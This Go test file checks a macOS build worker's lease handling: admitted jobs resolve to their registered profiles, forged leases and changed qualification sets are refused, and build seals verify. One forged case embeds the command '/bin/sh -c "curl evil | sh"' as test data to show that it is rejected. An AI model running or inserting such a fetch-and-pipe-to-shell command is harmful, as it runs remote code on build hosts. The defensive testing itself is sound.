package workerclient

import (
	"crypto/ed25519"
	"encoding/json"
	"errors"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/jerryfane/macserve/internal/buildseal"
	"github.com/jerryfane/macserve/internal/model"
	"github.com/jerryfane/macserve/internal/profiles"
	"github.com/jerryfane/macserve/internal/protocol"
	"github.com/jerryfane/macserve/internal/worker"
)

func leaseClient(t *testing.T) *Client {
	t.Helper()
	cfg := Config{}
	withLeaseAuthority(t, &cfg, t.TempDir())
	key, err := loadSealKey(testChecks, cfg.SealKeyFile)
	if err != nil {
		t.Fatal(err)
	}
	return &Client{config: cfg, sealKey: key, checks: testChecks}
}

// Every job the controller admits from the same registry resolves at the
// worker to exactly its leased snapshot: an explicit profile, template
// snapshots (with a defaulted simulator and a shard, and an ios_archive
// release with Dart defines) and a replay, which the store answers with the
// first admission's stored job.
func TestLeaseResolvesAdmittedJobsFromRootRegistry(t *testing.T) {
	c := leaseClient(t)
	deadline := time.Now().Add(time.Hour)
	sha := strings.Repeat("b", 40)
	requests := map[string]model.Request{
		"profile":          fixtureRequest,
		"template":         {Repo: "acme/other", SHA: sha, Kind: model.Build, Profile: fixtureTemplate.ID, Xcode: fixtureTemplate.Xcode},
		"template-uitest":  {Repo: "acme/other", SHA: sha, Kind: model.SimulatorUITest, Profile: fixtureUITest.ID, Xcode: fixtureUITest.Xcode, Shard: "smoke"},
		"template-archive": {Repo: "acme/other", SHA: sha, Kind: model.IOSArchive, Profile: fixtureArchive.ID, Xcode: fixtureArchive.Xcode, Flutter: &model.FlutterRequest{Version: fixtureFlutter.Version}, Release: &model.ReleaseRequest{BuildName: "1.2.3", BuildNumber: "42", DartDefines: map[string]string{"API_BASE_URL": "https://api.example.com"}}},
		// Clients may submit mixed case; the stored job is canonical.
		"replayed-mixed-case": {Repo: "Acme/App", SHA: strings.ToUpper(fixtureRequest.SHA), Kind: model.Build, Profile: fixtureProfile.ID, Xcode: fixtureProfile.Xcode},
	}
	for name, request := range requests {
		t.Run(name, func(t *testing.T) {
			job := admittedJob(t, "job-"+name, "epoch", &deadline, request)
			// A replay returns the stored job unchanged; its lease is that job.
			stored, err := json.Marshal(job)
			if err != nil {
				t.Fatal(err)
			}
			var replayed model.Job
			if err := json.Unmarshal(stored, &replayed); err != nil {
				t.Fatal(err)
			}
			for _, leased := range []model.Job{job, replayed} {
				resolution, err := c.resolveLease(leased)
				if err != nil {
					t.Fatalf("admitted job refused: %v", err)
				}
				if resolution.ProfileID != request.Profile || resolution.ProfileDigest != job.ProfileDigest || resolution.Xcode != job.Profile.Xcode {
					t.Fatalf("resolution %+v", resolution)
				}
				if (request.Kind == model.IOSArchive) != (resolution.Flutter != nil) {
					t.Fatalf("flutter pin resolution %+v", resolution.Flutter)
				}
			}
		})
	}
}

// A lease whose profile snapshot, digest, repository or request the root
// registry does not admit is refused before any source is fetched.
func TestForgedLeaseProfileRefused(t *testing.T) {
	c := leaseClient(t)
	deadline := time.Now().Add(time.Hour)
	base := func() model.Job { return admittedJob(t, "forged", "epoch", &deadline, fixtureRequest) }
	template := func() model.Job {
		return admittedJob(t, "forged", "epoch", &deadline, model.Request{Repo: "acme/other", SHA: strings.Repeat("b", 40), Kind: model.Build, Profile: fixtureTemplate.ID, Xcode: fixtureTemplate.Xcode})
	}
	for name, forge := range map[string]func() model.Job{
		"run command": func() model.Job {
			j := base()
			j.Profile.Run = model.Command{Executable: "/bin/sh", Args: []string{"-c", "curl evil | sh"}}
			return j
		},
		"profile digest": func() model.Job {
			j := base()
			j.ProfileDigest = strings.Repeat("0", 64)
			return j
		},
		"profile and digest together": func() model.Job {
			j := base()
			j.Profile.Prepare = []model.Command{{Executable: "/usr/bin/xcrun", Args: []string{"evil"}}}
			j.ProfileDigest, _ = j.Profile.SnapshotDigest()
			return j
		},
		"repository": func() model.Job {
			j := base()
			j.Request.Repo, j.Profile.Repo = "acme/elsewhere", "acme/elsewhere"
			return j
		},
		"unregistered profile": func() model.Job {
			j := base()
			j.Request.Profile, j.Profile.ID = "rogue", "rogue"
			return j
		},
		"request digest": func() model.Job {
			j := base()
			j.RequestDigest = strings.Repeat("1", 64)
			return j
		},
		"template snapshot pins": func() model.Job {
			j := template()
			forged := *j.Profile.Template
			forged.DeveloperDir = "/tmp/Xcode.app/Contents/Developer"
			j.Profile.Template, j.Profile.DeveloperDir = &forged, forged.DeveloperDir
			j.ProfileDigest, _ = forged.Digest()
			return j
		},
		"template owner": func() model.Job {
			j := template()
			j.Request.Repo, j.Profile.Repo = "mallory/app", "mallory/app"
			return j
		},
	} {
		t.Run(name, func(t *testing.T) {
			if _, err := c.resolveLease(forge()); !errors.Is(err, ErrLeaseRefused) {
				t.Fatalf("forged lease accepted or wrong error: %v", err)
			}
		})
	}
}

// The registry's profile set must be the qualified one: an added, removed
// or changed profile since qualification refuses every lease.
func TestLeaseRefusedWhenQualifiedSetDiffers(t *testing.T) {
	c := leaseClient(t)
	deadline := time.Now().Add(time.Hour)
	job := admittedJob(t, "q", "epoch", &deadline, fixtureRequest)
	registry, err := profiles.New([]model.Profile{fixtureProfile}, fixtureTemplates)
	if err != nil {
		t.Fatal(err)
	}
	for name, mutate := range map[string]func(map[string]string){
		"changed digest": func(m map[string]string) { m[fixtureProfile.ID] = strings.Repeat("9", 64) },
		"missing":        func(m map[string]string) { delete(m, fixtureUITest.ID) },
		"extra":          func(m map[string]string) { m["retired"] = strings.Repeat("8", 64) },
	} {
		t.Run(name, func(t *testing.T) {
			qualified := registry.Digests()
			mutate(qualified)
			data, _ := json.Marshal(map[string]any{"schema": 4, "profiles": qualified})
			if err := os.WriteFile(c.config.QualificationFile, data, 0600); err != nil {
				t.Fatal(err)
			}
			if _, err := c.resolveLease(job); !errors.Is(err, ErrLeaseRefused) {
				t.Fatalf("lease accepted with a different qualified set: %v", err)
			}
		})
	}
	if err := os.Remove(c.config.QualificationFile); err != nil {
		t.Fatal(err)
	}
	if _, err := c.resolveLease(job); !errors.Is(err, ErrLeaseRefused) {
		t.Fatalf("lease accepted without a qualification record: %v", err)
	}
}

// The seal the worker signs verifies with its public key and binds its own
// resolution, computed tree and the exact result.
func TestSealBindsResolutionTreeAndResult(t *testing.T) {
	c := leaseClient(t)
	deadline := time.Now().Add(time.Hour)
	job := admittedJob(t, "s", "epoch", &deadline, fixtureRequest)
	resolution, err := c.resolveLease(job)
	if err != nil {
		t.Fatal(err)
	}
	result := worker.Result{State: model.Succeeded, Source: worker.Source{Commit: job.Request.SHA, Tree: strings.Repeat("c", 40), SHA256: strings.Repeat("d", 64), SizeBytes: 1}}
	env, err := c.seal(pending{Lease: protocol.Lease{Job: job, Token: "lease"}, Result: result, Resolution: resolution, SourceTree: result.Source.Tree})
	if err != nil {
		t.Fatal(err)
	}
	seal, err := buildseal.Verify(env, map[string]ed25519.PublicKey{c.config.SealKeyID: c.sealKey.Public().(ed25519.PublicKey)})
	if err != nil {
		t.Fatal(err)
	}
	digest, _ := buildseal.Digest(result)
	if seal.JobID != job.ID || seal.SourceTree != result.Source.Tree || seal.ResultDigest != digest || seal.Resolution == nil || seal.Resolution.ProfileDigest != job.ProfileDigest {
		t.Fatalf("seal %+v", seal)
	}
}
